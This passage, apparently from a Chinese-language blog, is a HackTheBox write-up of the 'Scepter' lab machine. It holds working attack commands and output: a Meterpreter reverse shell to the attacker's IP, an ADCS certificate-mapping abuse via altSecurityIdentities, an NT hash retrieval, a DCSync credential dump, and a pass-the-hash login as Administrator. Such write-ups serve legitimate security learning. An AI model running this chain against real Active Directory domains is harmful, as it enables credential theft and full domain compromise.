Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport 1234\nlport => 1234\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost 10.10.16.59\nlhost => 10.10.16.59\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.59:1234 \n</code></pre>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> upload shell.exe\n                                        \nInfo: Uploading /root/Desktop/test/Scepter/shell.exe to C:\\Users\\h.brown\\Documents\\shell.exe\n                                        \nData: 98400 bytes of 98400 bytes copied\n                                        \nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> ./shell.exe\n</code></pre>\n<pre><code class=\"hljs language-bash\">msf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.59:1234 \n[*] Sending stage (177734 bytes) to 10.10.11.65\n[*] Meterpreter session 1 opened (10.10.16.59:1234 -> 10.10.11.65:60515) at 2025-04-26 06:25:04 -0400\n\nmeterpreter > \n</code></pre>\n<p>创建计算机账户 <code>ciallo</code></p>\n<pre><code class=\"hljs language-bash\">➜  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 123456 add computer ciallo 123456\n[+] ciallo created\n</code></pre>\n<p>通过 <code>certipy</code> 请求证书</p>\n<pre><code class=\"hljs language-bash\">➜  Scepter certipy-ad req -username <span class=\"hljs-string\">\"ciallo$\"</span> -p 123456 -target <span class=\"hljs-string\">\"dc01.scepter.htb\"</span> -ca <span class=\"hljs-string\">'scepter-DC01-CA'</span> -template <span class=\"hljs-string\">'Machine'</span> -dc-ip 10.10.11.65 -debug\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[+] Trying to resolve <span class=\"hljs-string\">'dc01.scepter.htb'</span> at <span class=\"hljs-string\">'10.10.11.65'</span>\n[+] Generating RSA key\n[*] Requesting certificate via RPC\n[+] Trying to connect to endpoint: ncacn_np:10.10.11.65[\\pipe\\cert]\n[+] Connected to endpoint: ncacn_np:10.10.11.65[\\pipe\\cert]\n[*] Successfully requested certificate\n[*] Request ID is 23\n[*] Got certificate with DNS Host Name <span class=\"hljs-string\">'ciallo.scepter.htb'</span>\n[*] Certificate object SID is <span class=\"hljs-string\">'S-1-5-21-74879546-916818434-740295365-9104'</span>\n[*] Saved certificate and private key to <span class=\"hljs-string\">'ciallo.pfx'</span>\n</code></pre>\n<p>将证书转换为<code>crt</code>并查看信息</p>\n<pre><code class=\"hljs language-bash\">➜  Scepter certipy-ad cert -pfx ciallo.pfx -nokey -out ciallo.crt\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Writing certificate and  to <span class=\"hljs-string\">'ciallo.crt'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Scepter openssl x509 -<span class=\"hljs-keyword\">in</span> ciallo.crt -noout -serial -issuer\nserial=620000001B02CCD1DA2D79435E00000000001B\nissuer=DC=htb, DC=scepter, CN=scepter-DC01-CA\n</code></pre>\n<p>我们使用证书中的序列号和颁发者 <code>distinguishedName</code> 来获取 <code>X509IssuerSerialNumber</code> 映射格式</p>\n<p>使用 GPT 来根据脚本：<a href=\"https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1\">https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1</a> 改编为 Python 脚本，并运行。</p>\n<pre><code class=\"hljs language-bash\">import argparse\n\ndef convert(serial, issuer):\n    serial = serial.replace(<span class=\"hljs-string\">':'</span>, <span class=\"hljs-string\">''</span>).lower()\n    serial_bytes = bytearray.fromhex(serial)\n    serial_bytes.reverse()\n    serial_hex = <span class=\"hljs-string\">''</span>.<span class=\"hljs-built_in\">join</span>([<span class=\"hljs-string\">'%02x'</span> % b <span class=\"hljs-keyword\">for</span> b <span class=\"hljs-keyword\">in</span> serial_bytes])\n    \n    <span class=\"hljs-comment\"># 拆分 issuer，并反转顺序</span>\n    issuer_parts = issuer.split(<span class=\"hljs-string\">','</span>)\n    issuer_parts = [p.strip() <span class=\"hljs-keyword\">for</span> p <span class=\"hljs-keyword\">in</span> issuer_parts]\n    issuer_parts.reverse()  <span class=\"hljs-comment\"># 反转顺序，这里不改</span>\n    issuer_str = <span class=\"hljs-string\">','</span>.<span class=\"hljs-built_in\">join</span>(issuer_parts)\n    \n    <span class=\"hljs-comment\"># 调整输出顺序：确保 \"DC=scepter,DC=htb\" 在 \"CN=scepter-DC01-CA\" 之前</span>\n    issuer_str = issuer_str.replace(<span class=\"hljs-string\">\"CN=\"</span>, <span class=\"hljs-string\">\"\"</span>).replace(<span class=\"hljs-string\">\"DC=\"</span>, <span class=\"hljs-string\">\"CN=\"</span>).replace(<span class=\"hljs-string\">\",\"</span>, <span class=\"hljs-string\">\",DC=\"</span>).strip()\n    \n    <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"X509:&#x3C;I>{issuer_str}&#x3C;SR>{serial_hex}\"</span>)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">'__main__'</span>:\n    parser = argparse.ArgumentParser()\n    parser.add_argument(<span class=\"hljs-string\">'-serial'</span>, required=True, <span class=\"hljs-built_in\">help</span>=<span class=\"hljs-string\">'Certificate serial (colon separated)'</span>)\n    parser.add_argument(<span class=\"hljs-string\">'-issuer'</span>, required=True, <span class=\"hljs-built_in\">help</span>=<span class=\"hljs-string\">'Certificate issuer'</span>)\n    args = parser.parse_args()\n    \n    convert(args.serial, args.issuer)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Scepter python Get-X509IssuerSerialNumberFormat.py\nX509:&#x3C;I>CN=scepter-DC01-CA,DC=scepter,DC=htb&#x3C;SR>B10000000000E53497D2AD1DCC20B100000026\n</code></pre>\n<p>通过 PowerShell 更改用户 h.brown 的 <code>altSecurityIdentities</code> 属性（GPT）</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$map</span> = <span class=\"hljs-string\">'X509:&#x3C;I>DC=htb,DC=scepter,CN=scepter-DC01-CA&#x3C;SR>2800000000008dde9c88b25b6ad22800000062'</span>\nSet-ADUser p.adams -Replace @{altSecurityIdentities=<span class=\"hljs-variable\">$map</span>}\n</code></pre>\n<pre><code class=\"hljs language-bash\">meterpreter > shell\nProcess 4920 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.7131]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\h.brown\\Documents>powershell\npowershell\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\h.brown\\Documents> <span class=\"hljs-variable\">$map</span> = <span class=\"hljs-string\">'X509:&#x3C;I>CN=scepter-DC01-CA,DC=scepter,DC=htb&#x3C;SR>170000000000f4a3741fa7d9137b1700000062'</span>\n<span class=\"hljs-variable\">$map</span> = <span class=\"hljs-string\">'X509:&#x3C;I>CN=scepter-DC01-CA,DC=scepter,DC=htb&#x3C;SR>170000000000f4a3741fa7d9137b1700000062'</span>\nPS C:\\Users\\h.brown\\Documents> Set-ADUser -Identity <span class=\"hljs-string\">\"p.adams\"</span> -Replace @{altSecurityIdentities=<span class=\"hljs-variable\">$map</span>}\nSet-ADUser -Identity <span class=\"hljs-string\">\"p.adams\"</span> -Replace @{altSecurityIdentities=<span class=\"hljs-variable\">$map</span>}\n</code></pre>\n<p>查看更改后的属性值</p>\n<pre><code class=\"hljs language-bash\">Get-ADUser -Identity <span class=\"hljs-string\">\"p.adams\"</span> -Properties altSecurityIdentities | Select-Object altSecurityIdentities\n</code></pre>\n<p>通过 <code>certipy</code> 根据计算机账户的证书 <code>ciallo.pfx</code> 申请用户 <code>p.adams</code> 的 <code>TGT</code></p>\n<pre><code class=\"hljs language-bash\">➜  Scepter certipy-ad auth -pfx ciallo.pfx -dc-ip 10.10.11.65 -username p.adams\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[!] The provided username does not match the identification found <span class=\"hljs-keyword\">in</span> the provided certificate: <span class=\"hljs-string\">'P.ADAMS'</span> - <span class=\"hljs-string\">'ciallo$'</span>\nDo you want to <span class=\"hljs-built_in\">continue</span>? (Y/n) y\n[*] Using principal: p.adams@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to <span class=\"hljs-string\">'p.adams.ccache'</span>\n[*] Trying to retrieve NT <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'p.adams'</span>\n[*] Got <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'p.adams@scepter.htb'</span>: aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image6.png\" alt=\"image.png\"></p>\n<p>直接 <code>DCSync</code></p>\n<pre><code class=\"hljs language-bash\">➜  Scepter secretsdump.py -k -no-pass dc01.scepter.htb -dc-ip 10.10.11.65                                       \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n                                                                                                               \n[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::\n...many...\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Scepter evil-winrm -i dc01.scepter.htb -u administrator -H a291ead3493f9773dc615e66c2ea21c4\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> \n</code></pre>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Administrator\\desktop> <span class=\"hljs-built_in\">type</span> root.txt\nfcd40eb94aeca1942488f8decb6cc0b7\n</code></pre>\n<h2>总结</h2>\n<p>反正就是每次打AD都是不会的，靠大佬带过的…</p>\n<p>第一次遇到 ADCS 类的攻击，无从下手，任重道远。</p>","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","updated":"2025-04-26","comments":true,"tags":["Windows靶机","HackTheBox","ADCS","ESC","encrypt"],"categories":"靶机","description":"Machine - Scepter\n\n https://app.hackthebox.com/machines/Scepter | `Hard`\n \n\nPS：一直以为 Season 过了之后就不能白嫖靶机了…导致错过了两周的靶机…呜呜呜\n\n前期踩点\n\n\n\n`Windows` 靶机的端口，但不一定是域控主机（PS:后面才知道我扫描出来的端口shao）\n\n\n\nNFS\n\n\n\n很多的信息，尝试从里面获取有...","isEncrypted":true},"recentPosts":[{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","isEncrypted":true,"year":"2025","month":"07","day":"13"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","isEncrypted":true,"year":"2025","month":"07","day":"07"},{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"}]},"__N_SSG":true}